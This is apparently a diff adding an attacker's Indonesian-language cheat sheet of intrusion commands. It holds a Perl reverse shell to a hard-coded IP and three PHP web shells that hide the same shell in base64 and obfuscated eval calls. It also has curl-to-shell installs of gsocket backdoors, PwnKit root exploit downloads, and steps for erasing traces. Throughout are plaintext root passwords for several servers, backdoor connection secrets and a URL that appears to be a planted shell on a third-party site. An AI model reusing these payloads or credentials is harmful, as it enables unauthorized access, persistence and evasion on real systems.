@@ -1,0 +1,109 @@
+Main IP: 207.148.70.80
+username: root
+Root pass: Kontolkudangaceng69%$
+
+
+perl -e 'use Socket;$i="207.148.70.80";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+
+versi php
+<?php
+$code = 'cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTQ5LjI4LjE1NC4yMjkiOyRwPTQ0Mztzb2NrZXQoUyxQRl9JTkVULFNvQ0tfU1RSRUFNLGdldHByb3RvYm5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZGFyX2luKCRwLGluZXRfYXRvbigkaSkpKXtvcGVuKFNURElOLCImPlMiKTtvcGVuKFNURE9VVCwiJj5TIik7b3BlbihTVERFUlIsIiY+UyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Ow==';
+eval("system(base64_decode('$code'));");
+?>
+
+versi obfuscate
+<?php
+$___ = str_replace('~','',
+'ev~al(~"sy~ste~m(ba~se6~4_de~cod~e(~\'cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTQ5LjI4LjE1NC4yMjkiOyRwPTQ0Mztzb2NrZXQoUyxQRl9JTkVULFNvQ0tfU1RSRUFNLGdldHByb3RvYm5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZGFyX2luKCRwLGluZXRfYXRvbigkaSkpKXtvcGVuKFNURElOLCImPlMiKTtvcGVuKFNURE9VVCwiJj5TIik7b3BlbihTVERFUlIsIiY+UyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Ow==\'));~");
+');
+$___();
+?>
+versi deeper
+<?php
+$a = 'bas'.'e64'.'_de'.'code';
+$b = 'sys'.'tem';
+$c = 'cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTQ5LjI4LjE1NC4yMjkiOyRwPTQ0Mztzb2NrZXQoUyxQRl9JTkVULFNvQ0tfU1RSRUFNLGdldHByb3RvYm5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZGFyX2luKCRwLGluZXRfYXRvbigkaSkpKXtvcGVuKFNURElOLCImPlMiKTtvcGVuKFNURE9VVCwiJj5TIik7b3BlbihTVERFUlIsIiY+UyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Ow==';
+
+$e = $b;
+$d = $a($c);
+$e($d);
+?>
+
+scp cowroot /tmp/
+
+GS
+bash -c "$(curl -fsSL https://gsocket.io/x)"
+BYPASS 
+bash -c "$(curl -fsSL https://minisocket.io/bin/x)"
+
+
+BUG ROOT
+sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
+
+sh -c "$(wget -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
+
+METHODE BARU
+curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
+chmod +x ./PwnKit
+./PwnKit
+
+
+Beresihan Jejak (Lamun butuh latihan blue team)
+
+rm /tmp/cowroot
+
+cp /tmp/passwd.bak /etc/passwd
+
+SYARAT ROOT 
+- KERNEL DIBAWAH TAHUN 2021
+
+CEK ROOT
+ls -la /usr/bin/pkexec 
+
+CIRI2 VULN BUG ROOT PWNKIT
+-rwsr-xr-x. 1 root root 27680 Apr 11  2018 /usr/bin/pkexec
+
+CIRI2 BUG ROOT PWNKIT DIPATCH 
+-rwxr-xr-x. 1 root root 27680 Apr 11  2018 /usr/bin/pkexec
+
+vps
+Main IP: 149.28.154.229
+username: root
+Root pass: seok1337@@
+
+
+https://hr.tarunabakti.or.id//asset/manfile/include/wget-md5.php
+--> To connect use one of the following:
+--> gs-netcat -s "33oMk7CjanyEF67ZCWiQ4m" -i
+
+
+
+--> To uninstall use GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/x)"
+--> To connect use one of the following:
+--> gs-netcat -s "69GLzvu8YUVgkqV4f2gDAx" -i
+
+
+baru ulik
+curl -o hackshell.sh https://raw.githubusercontent.com/hackerschoice/hackshell/refs/heads/main/hackshell.sh
+source ./hackshell.sh
+
+
+untuk scan kernel dan nyari privilege escalation
+curl -s -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+
+done
+
+Nama VPS: raizovps
+IP: 139.180.131.167
+username: root
+password: Kontolkuda100%
+
+rdp
+IP : 213.35.98.245
+User : opc
+Pass : @Senoparty88
+
+
